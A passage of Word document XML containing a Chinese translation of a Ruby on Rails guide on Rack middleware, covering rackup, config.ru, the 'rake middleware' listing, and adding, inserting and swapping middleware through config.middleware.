      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="5FCEC73B" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3214F95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ActionDispatch::Static</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="69AE53B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提供 </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Rails.root/public</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> 目录内的静态文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="62EB6185" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1ABE194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Rails::Rack::Debugger</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="09DC490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启动调试器</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7B09176F"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 xml:space="preserve">2.3 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rackup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26D501A6"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使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rackup</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 而不是 Rails 的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails server</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，你可以把下面的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.ru</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 放在 Rails 应用的根目录内：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4320"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="3CAD49B6" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="54AD0EC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Rails.root/config.ru</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E1BC69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require "config/environment"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A9EB62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15BF809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Rails::Rack::LogTailer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6EB5DD9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ActionDispatch::Static</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="520248B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run ActionController::Dispatcher.new</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5EF196CB"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并启动服务器：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2160"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="3A26C4E7" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7532D51E" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="139620526"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rackup config.ru</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7C5CA60F"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更多其他 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rackup</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1800"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="183C32A8" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="095B8CFB" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1045569356"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rackup --help</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="587016B8"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3 动作控制器中间件堆栈</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F2479D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许多行动控制器的内部组件是作为 Rack 中间件实现的。 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionController::Dispatcher</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionController::MiddlewareStack</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 结合各种内部和外部的中间件，形成一个完整的 Rails Rack 应用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1562332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Rails 的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionController::MiddlewareStack</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 相当于 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rack::Builder</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，但具有更好的灵活性和更多的功能，以满足 Rails 的需求。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73501130"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3.1 检查中间件堆栈</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61B051F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Rails 为检查中使用的中间件堆栈提供了方便的 rake task ：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2040"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="4313C7DC" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4445C142" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="246034918"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rake middleware</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="68E7165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对于一个新生成的 Rails 应用，可能会有类似输出：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6960"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="57261608" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="045001A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ActionDispatch::Static</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C5B866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Rack::Lock</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E3F31F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ActiveSupport::Cache::Strategy::LocalCache</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="496CE52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Rack::Runtime</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71A04F9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Rails::Rack::Logger</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E19BA0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ActionDispatch::ShowExceptions</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C019F1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ActionDispatch::DebugExceptions</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55411051"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ActionDispatch::RemoteIp</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C1BE0E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Rack::Sendfile</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="148F997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ActionDispatch::Callbacks</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64004A9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ActiveRecord::ConnectionAdapters::ConnectionManagement</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A3B730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ActiveRecord::QueryCache</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55B9A9E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ActionDispatch::Cookies</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4EB7668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ActionDispatch::Session::CookieStore</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6CE4DC3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ActionDispatch::Flash</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22E163B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ActionDispatch::ParamsParser</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BBBBB8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Rack::MethodOverride</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C14EAA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ActionDispatch::Head</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="397BCC22"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ActionDispatch::BestStandardsSupport</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D5313A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run Blog::Application.routes</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6B28105D"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每个中间件的用途在"内部中间件":#internal-middleware-stack 一节中解释。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B08A95B"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3.2 配置中间件堆栈</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="165605B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Rails 提供了一个简单的配置接口 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.middleware</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来添加，删除和修改在中间件堆栈中的中间件，通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>application.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或特定环境配置文件 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>environments/&lt;environment&gt;.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D26087B"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3.2.1 添加一个中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3720501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你可以添加一个新的中间件到中间件堆栈中，使用下列任何一种方法：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DAC7FE7" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="239"/>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config.middleware.use(new_middleware, args)</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 添加新的中间件到中间件栈底。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DB3B80F" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="240"/>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config.middleware.insert_before(existing_middleware, new_middleware, args)</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 添加新的中间件到指定的中间件堆栈中现有的中间件前。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42A8C3BB" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="241"/>
        </w:numPr>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rPr>
        <w:t>config.middleware.insert_after(existing_middleware, new_middleware, args)</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 添加新的中间件到指定的中间件堆栈中现有的中间件后。</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1DD1BE86" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5F69C42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config/application.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7798247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22BB46C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将 Rack::BounceFavicon 推到栈底</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="059691C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config.middleware.use Rack::BounceFavicon</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C62C76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74885A8F"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添加 Lifo::Cache 到 ActiveRecord::QueryCache 之后</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E071D4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传递 { :page_cache =&gt; false } 参数到 Lifo::Cache.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="61FC0ED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config.middleware.insert_after ActiveRecord::QueryCache, Lifo::Cache, :page_cache</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; false</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1286D68D"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3.2.2 交换中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E197B8"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你可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.middleware.swap</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 交换现有的中间件中间件堆栈。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7800"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="5659BB9A" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3E86460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config/application.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4039991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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7CB2EEA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替换 ActionController::Failsafe 为 Lifo::Failsafe</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="777B758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config.middleware.swap ActionController::Failsafe, Lifo::Failsafe</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4B7ED5E4" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>3.2.3 中间件堆栈是一个数组</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BE06897"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中间件堆栈的行为就像一个正常的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Array</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
